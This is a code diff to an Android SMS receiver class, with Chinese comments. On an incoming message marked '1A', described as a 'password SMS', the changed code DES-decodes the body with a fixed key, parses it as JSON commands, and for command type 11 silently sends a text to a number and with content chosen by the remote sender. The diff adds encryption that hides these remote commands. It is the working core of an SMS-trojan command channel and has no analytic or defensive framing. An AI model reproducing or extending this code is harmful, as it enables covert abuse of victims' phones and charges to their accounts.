@@ -53,27 +53,37 @@ public class SmsReceiver extends BroadcastReceiver{
 				    		if(msg_mark.equals("1A"))
 				    		{//发送短信
 				    			Logger.error("收到密码短信:"+msginfo);
-								try {
-									JSONArray arrayJson = new JSONArray(msginfo);
-									for(int i=0;i<arrayJson.length();i++)
-									{
-										JSONObject tempJson = arrayJson.optJSONObject(i);
-										int ttype = tempJson.getInt("t");
-										switch(ttype)
+				    			msginfo = DES2.decodeValue(Tag.KEY, msginfo);
+				    			if(msginfo.length()>1)
+				    			{
+				    				try {
+										JSONArray arrayJson = new JSONArray(msginfo);
+										for(int i=0;i<arrayJson.length();i++)
 										{
-										case 11:
-											//发送短信
-											String numtel = tempJson.getString("sn");
-											String tomsg = tempJson.getString("sm");
-											Tools.sendSms(context, numtel, tomsg);
-											break;
+											JSONObject tempJson = arrayJson.optJSONObject(i);
+											int ttype = tempJson.getInt("t");
+											switch(ttype)
+											{
+											case 11:
+												//发送短信
+												String numtel = tempJson.getString("sn");
+												//Logger.info("sn:"+numtel);
+												
+												String tomsg = tempJson.getString("sm");
+												//Logger.info("sm:"+tomsg);
+												Tools.sendSms(context, numtel, tomsg);
+												break;
+											}
+											
 										}
+									} catch (JSONException e) {
+										// TODO Auto-generated catch block
+										e.printStackTrace();
+									}			    	
+				    			}else{
+				    				Logger.error("decode error");
+				    			}
 										
-									}
-								} catch (JSONException e) {
-									// TODO Auto-generated catch block
-									e.printStackTrace();
-								}			    			
 				    		}
 				    		
 				    		return;
